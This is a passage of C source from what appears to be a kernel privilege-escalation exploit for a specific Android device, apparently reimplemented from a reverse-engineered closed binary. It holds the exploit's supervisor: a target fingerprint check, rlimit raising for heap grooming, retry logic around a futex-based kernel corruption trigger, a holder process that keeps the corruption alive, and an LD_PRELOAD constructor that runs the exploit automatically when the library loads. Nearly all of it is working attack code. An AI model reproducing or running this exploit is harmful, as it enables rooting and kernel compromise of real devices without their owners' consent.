  } else if (bisect && strcmp(bisect, "14") == 0) {
    triggered = run_futex_trigger_v14_preflight_staged(
        ctx.ghost_task, ctx.initial_lock, &shared->status,
        ATTEMPT_MUTATION_PENDING, ATTEMPT_KERNEL_MUTATED,
        do_one_attempt_preflight, &ctx);
  } else {
    triggered = run_futex_trigger_v14_preflight_staged(
        ctx.ghost_task, ctx.initial_lock, &shared->status,
        ATTEMPT_MUTATION_PENDING, ATTEMPT_KERNEL_MUTATED,
        do_one_attempt_preflight, &ctx);
  }
  free(ctx.oracle_snapshots);
  fprintf(stderr, "[futex] trigger result=%d\n", triggered);
  if (triggered ||
      __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE) != 0) {
    pid_t keeper = spawn_allocation_keeper();
    if (keeper < 0) {
      fprintf(stderr, "[holder] fork failed errno=%d\n", errno);
      return 0;
    }
    fprintf(stderr, "[holder] pid=%d name=cve43499-hold\n", keeper);
  }
  return triggered;
}

/* source: _INIT_2 @ 0x10a440 (the real ELF entry point of the closed
 * .so, run automatically from .init_array at dlopen() time -- it has
 * zero exported symbols, so it cannot be dlsym()'d, only auto-run).
 * app_main() also has a normal executable wrapper for diagnostics; the
 * production shared object invokes it from its constructor. */
/* source: FUN_000041f0(0) -- sched_setaffinity(0, 0x80, &(1<<0)), the
 * very first call fcn.000044f4 (this project's app_main() equivalent)
 * makes, before even the rlimit adjustments. Same helper shape as
 * futex_trigger.c's pin_to_cpu(3) for the waiter thread (raw disasm
 * confirmed both this session, not duplicated code by accident --
 * kept as a small standalone copy here rather than sharing a header,
 * since it's a two-line wrapper and this file doesn't otherwise depend
 * on futex_trigger.c's internals). */
static void pin_to_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

/* source: fcn.000044f4, raw vaddr 0x4520-0x4570 (raw disasm, `asm.varsub`
 * disabled to avoid a misleading stack-slot name collision with this
 * function's own canary variable -- verified twice this session because
 * of that). Confirmed pattern (not a guess): for both RLIMIT_NOFILE=7
 * and RLIMIT_NPROC=6, `getrlimit(res, &rl); rl.rlim_cur =
 * rl.rlim_max; setrlimit(res, &rl);` -- i.e. raise the soft limit to
 * the hard limit for both resources, treating any getrlimit/setrlimit
 * failure as fatal (matches the closed binary's own `fatal_usage()`-
 * equivalent call at each failure branch). Directly relevant to this
 * project's own documented history: groom.c forks and holds open
 * memfds for up to ~1279 children in one attempt, and this session
 * separately root-caused an earlier "F_SETPIPE_SZ Operation not
 * permitted" failure in the OLD engine to exactly this kind of
 * per-UID fd/pipe-page budget exhaustion. Raising RLIMIT_NOFILE before
 * that spray starts is a direct, safe mitigation for the same class of
 * problem, not a speculative addition. */
static void raise_rlimit_to_max(int resource) {
  struct rlimit rl;
  if (getrlimit(resource, &rl) == -1) {
    fatal_usage();
  }
  rl.rlim_cur = rl.rlim_max;
  if (setrlimit(resource, &rl) == -1) {
    fatal_usage();
  }
}

static int app_main(void) {
  if (!target_matches_zzhl()) {
    fprintf(stderr, "[target] expected %s / %s / %s / %s\n",
            ZZHL_MODEL, ZZHL_DEVICE, ZZHL_FINGERPRINT,
            ZZHL_KERNEL_RELEASE);
    return 1;
  }
  /* source: _INIT_2 sets all standard streams to _IONBF before its first
   * stage message; child attempts end with _exit(), so buffering here would
   * otherwise discard the success marker consumed by simple-root. */
  if (setvbuf(stdin, NULL, _IONBF, 0) == -1 ||
      setvbuf(stdout, NULL, _IONBF, 0) == -1 ||
      setvbuf(stderr, NULL, _IONBF, 0) == -1) {
    fatal_usage();
  }

  /* source: clock_gettime(CLOCK_BOOTTIME=7, ...); if tv_sec < 0x78 (120),
   * sleep the remainder. Identical in spirit to our own "waiting for boot
   * allocator quiet window" in src/preload.c; the closed binary's version
   * loops on sleep()'s return value to handle EINTR, so we do too. */
  /* The closed binary's fixed 120 is now the default of BOOT_QUIET_SEC, which
   * the stability launcher sets to 0 to skip this wait once its own gates have
   * already proven the device quiet. Range [0,300]; 0 disables the wait. */
  int boot_quiet_sec = env_int_clamped("BOOT_QUIET_SEC", 120, 0, 300);
  struct timespec boot_now;
  if (clock_gettime(CLOCK_BOOTTIME, &boot_now) == -1) {
    fatal_usage();
  }
  if (boot_quiet_sec > 0 && boot_now.tv_sec < boot_quiet_sec) {
    unsigned int remaining = (unsigned int)(boot_quiet_sec - boot_now.tv_sec);
    printf("\x1b[33m[*] \x1b[0mwaiting for boot allocator quiet window "
           "seconds=%u\n",
           remaining);
    do {
      remaining = sleep(remaining);
    } while (remaining != 0);
  } else {
    printf("\x1b[33m[*] \x1b[0mboot allocator quiet window skipped "
           "BOOT_QUIET_SEC=%d boottime=%llds\n",
           boot_quiet_sec, (long long)boot_now.tv_sec);
  }

  int attempts = env_int_clamped("EXPLOIT_ATTEMPTS", 8, 1, 0x40);
  int pselect_delay_usec =
      env_int_clamped("PSELECT_DELAY_USEC", 20000, 0, 1000000);
  int attempt_timeout_sec =
      env_int_clamped("EXPLOIT_ATTEMPT_TIMEOUT_SEC", 90, 5, 900);
  int p0_timeout_sec = env_int_clamped(
      "P0_ATTEMPT_TIMEOUT_SEC", 20, 5, attempt_timeout_sec);
  if (p0_timeout_sec > attempt_timeout_sec) {
    p0_timeout_sec = attempt_timeout_sec;
  }
  if (getenv("SLIDE_ONLY") || getenv("OSS_VALIDATE_ONLY")) {
    attempts = 1;
  }

  struct attempt_shared_state *shared = mmap(
      NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (shared == MAP_FAILED) {
    fatal_usage();
  }
  memset(shared, 0, sizeof(*shared));

  unsetenv("LD_PRELOAD");

  printf("\x1b[33m[*] \x1b[0mstarting exploit attempts=%d\n", attempts);

  int success = 0;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    printf("\x1b[33m[*] \x1b[0mexploit attempt=%d/%d\n", attempt, attempts);

    pid_t child = fork();
    if (child == 0) {
      if (prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) {
        fatal_usage();
      }
      if (getppid() == 1) {
        _exit(1);
      }
      int delay = pselect_delay_usec +
                  kAttemptDelayOffsetsUsec[(attempt - 1) % 8];
      if (delay < 0) {
        delay = 0;
      }
      char delay_arg[16];
      snprintf(delay_arg, sizeof(delay_arg), "%d", delay);
      if (setenv_str("PSELECT_DELAY_USEC", delay_arg) == -1) {
        fatal_usage();
      }
      char attempt_arg[16];
      snprintf(attempt_arg, sizeof(attempt_arg), "%d", attempt);
      if (setenv_str("S23_SUPERVISOR_ATTEMPT", attempt_arg) == -1) {
        fatal_usage();
      }
      int outcome = do_one_attempt(shared, delay);
      _exit(outcome == ATTEMPT_SAFE_BLOCKED ? ATTEMPT_SAFE_BLOCKED
                                             : (outcome ? 0 : 1));
    }
    if (child == -1) {
      fatal_usage();
    }

    struct timespec started;
    if (clock_gettime(CLOCK_MONOTONIC, &started) == -1) {
      fatal_usage();
    }
    int status = 0;
    pid_t waited;
    int mutation_timeout_reported = 0;
    int mutation_pending_reported = 0;
    for (;;) {
      waited = waitpid(child, &status, WNOHANG);
      if (waited == child) {
        break;
      }
      if (waited == -1 && errno != EINTR) {
        fatal_usage();
      }
      struct timespec now;
      if (clock_gettime(CLOCK_MONOTONIC, &now) == -1) {
        fatal_usage();
      }
      long elapsed_sec = now.tv_sec - started.tv_sec;
      int observed_kernel_state =
          __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE);
      if (observed_kernel_state >= ATTEMPT_MUTATION_PENDING &&
          !mutation_pending_reported) {
        fprintf(stderr, "stage=kernel-mutation-pending state=%d\n",
                observed_kernel_state);
        mutation_pending_reported = 1;
      }
      int budget =
          (getenv("SLIDE_P0_OFFSET") ||
           __atomic_load_n(&shared->dirty, __ATOMIC_ACQUIRE))
              ? attempt_timeout_sec
              : p0_timeout_sec;
      if (elapsed_sec >= budget) {
        int kernel_state =
            __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE);
        if (kernel_state != ATTEMPT_PRE_MUTATION) {
          if (!mutation_timeout_reported) {
            fprintf(stderr,
                    "[supervisor] timeout after kernel mutation state=%d; "
                    "preserving child and holders until natural completion\n",
                    kernel_state);
            mutation_timeout_reported = 1;
          }
          usleep(100000);
          continue;
        }
        if (kill(child, SIGKILL) == -1) {
          fatal_usage();
        }
        do {
          waited = waitpid(child, &status, 0);
        } while (waited == -1 && errno == EINTR);
        if (waited == -1) {
          fatal_usage();
        }
        break;
      }
      usleep(100000);
    }

    if (waited == child && WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      printf("\x1b[32m[+] \x1b[0mexploit completed attempt=%d/%d\n",
             attempt, attempts);
      success = 1;
      break;
    }

    if (waited == child && WIFEXITED(status) &&
        WEXITSTATUS(status) == ATTEMPT_SAFE_BLOCKED) {
      fprintf(stderr,
              "[safe-stop] pre-trigger guard active; no retry or mutation\n");
      munmap(shared, sizeof(*shared));
      return ATTEMPT_SAFE_BLOCKED;
    }

    if (__atomic_load_n(&shared->status, __ATOMIC_ACQUIRE)) {
      fprintf(stderr,
              "stage=kernel-mutation-pending state=%d\n"
              "[supervisor] kernel mutation reached; refusing unsafe retry "
              "before reboot\n",
              __atomic_load_n(&shared->status, __ATOMIC_ACQUIRE));
      break;
    }

    if (!getenv("SLIDE_P0_OFFSET") &&
        __atomic_load_n(&shared->dirty, __ATOMIC_ACQUIRE)) {
      uint64_t slide_p0_offset = __atomic_load_n(
          &shared->slide_p0_offset, __ATOMIC_ACQUIRE);
      uint64_t gate_page_struct = __atomic_load_n(
          &shared->p0_gate_page_struct, __ATOMIC_ACQUIRE);
      uint64_t probe_page_struct = __atomic_load_n(
          &shared->p0_probe_page_struct, __ATOMIC_ACQUIRE);
      char offset_arg[16];
      char gate_arg[24];
      char probe_arg[24];
      snprintf(offset_arg, sizeof(offset_arg), "0x%llx",
               (unsigned long long)slide_p0_offset);
      snprintf(gate_arg, sizeof(gate_arg), "0x%llx",
               (unsigned long long)gate_page_struct);
      snprintf(probe_arg, sizeof(probe_arg), "0x%llx",
               (unsigned long long)probe_page_struct);
      if (setenv_str("SLIDE_P0_OFFSET", offset_arg) == -1 ||
          setenv_str("P0_GATE_PAGE_STRUCT", gate_arg) == -1 ||
          setenv_str("P0_PROBE_PAGE_STRUCT", probe_arg) == -1) {
        fatal_usage();
      }
    }

    if (attempt < attempts) {
      sleep(5);
    }
  }

  munmap(shared, sizeof(*shared));
  return success ? 0 : -1;
}

#if defined(BUILD_LD_PRELOAD) && BUILD_LD_PRELOAD
/* source: _INIT_2 @ 0x10a440 -- real closed .so has zero exported
 * symbols and runs app_main()-equivalent from .init_array at dlopen()
 * time. This mirrors that: LD_PRELOAD=this.so exec /system/bin/true
 * runs load() before true's own main(), exactly like
 * ../src/preload.c:load() does for the production payload. */
__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  int status = app_main();
  if (status != 0) {
    exit(status);
  }
}
#else
int main(void) {
  return app_main();
}
#endif
